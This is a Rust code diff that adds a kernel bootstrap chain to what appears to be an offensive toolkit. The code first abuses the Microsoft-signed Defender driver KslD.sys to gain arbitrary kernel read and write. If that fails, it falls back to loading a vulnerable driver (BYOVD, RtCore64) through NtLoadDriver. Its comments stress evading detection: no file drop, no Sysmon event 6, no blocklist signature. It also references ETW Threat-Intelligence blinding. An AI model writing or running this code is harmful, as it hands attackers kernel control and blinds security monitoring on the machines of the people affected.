@@ -33,11 +33,87 @@ pub mod kernel_base;
 pub mod pagewalk;
 pub mod pattern_scan;
 pub mod va_rw;
+/// KslD.sys — "Living off the Defender" KernelRw impl (default bootstrap).
+/// Uses the Microsoft-signed Defender driver for arbitrary kernel R/W without
+/// file drop or driver load. No blocklist signature, no Sysmon EID 6.
+pub mod ksld;
 
 use crate::{EtwTiKit, KernelRw, KitError};
 use crate::etwti::{EtwTiBlind, EtwTiOffsets};
 use crate::byovd::{ByovdDriver, VulnDriverIoctl, RtCore64};
 use alloc::boxed::Box;
+use alloc::format;
+
+/// The result of a successful kernel bootstrap — wraps whichever `KernelRw`
+/// primitive was obtained. The caller inspects the variant to decide cleanup
+/// (KslD has no explicit cleanup; BYOVD carries a `LoadedDriver` to unload).
+pub enum KernelBootstrap {
+    /// KslD.sys (Living off the Defender) — the preferred path.
+    /// No file drop, no driver load, no Sysmon EID 6. The device handle is
+    /// owned by `LivingOffDefender` and closed on drop.
+    KslD(ksld::LivingOffDefender),
+    /// BYOVD fallback — a vulnerable driver loaded via NtLoadDriver.
+    /// The `LoadedDriver` must be `unload()`ed by the caller on cleanup.
+    Byovd(driver_load::LoadedDriver, ByovdDriver),
+}
+
+impl KernelBootstrap {
+    /// Borrow the `KernelRw` regardless of variant.
+    pub fn as_kernel_rw(&self) -> &dyn KernelRw {
+        match self {
+            KernelBootstrap::KslD(d) => d,
+            KernelBootstrap::Byovd(_, d) => d,
+        }
+    }
+}
+
+/// Unified kernel bootstrap: KslD.sys → BYOVD fallback.
+///
+/// Follows the priority order from `docs/p2-2026-kernel-tier-deepdive.md §0`:
+/// 1. **KslD.sys** (Living off the Defender) — lowest noise, no driver load,
+///    no Sysmon EID 6, no blocklist risk. Default path.
+/// 2. **BYOVD** — fallback if KslD is unavailable (Defender disabled/tampered).
+///    Higher noise (Sysmon EID 6) but reliable.
+///
+/// Returns a `KernelBootstrap` enum so the caller knows which path was taken
+/// (relevant for cleanup: KslD auto-closes on drop; BYOVD needs `unload()`).
+///
+/// `sys_path` / `svc_name` are only used for the BYOVD fallback — they can be
+/// `None` to disable the BYOVD path entirely (KslD-only, fail if unavailable).
+///
+/// # Safety
+/// Loads a driver (BYOVD path) or opens a kernel device handle (KslD path).
+/// Both can BSOD on bad kernel writes. VM only.
+pub unsafe fn bootstrap_chain(
+    sys_path: Option<&[u16]>,
+    svc_name: Option<&[u16]>,
+) -> Result<KernelBootstrap, KitError> {
+    // Priority 1: KslD.sys — Living off the Defender.
+    match unsafe { ksld::bootstrap_ksld() } {
+        Ok(defender) => {
+            return Ok(KernelBootstrap::KslD(defender));
+        }
+        Err(e) => {
+            // KslD unavailable — log and fall through to BYOVD.
+            // Don't allocate here; just trace the reason.
+            let _ = e; // the KitError is informational; BYOVD may still work
+        }
+    }
+
+    // Priority 2: BYOVD fallback.
+    let (sys, svc) = match (sys_path, svc_name) {
+        (Some(s), Some(v)) => (s, v),
+        _ => {
+            return Err(KitError::Other(format!(
+                "bootstrap_chain: KslD unavailable and no BYOVD path provided \
+                 (pass sys_path + svc_name to enable BYOVD fallback)"
+            )));
+        }
+    };
+
+    let (loaded, krw) = unsafe { bootstrap_byovd(sys, svc) }?;
+    Ok(KernelBootstrap::Byovd(loaded, krw))
+}
 
 /// The full BYOVD bootstrap: load driver → open device → return KernelRw.
 ///
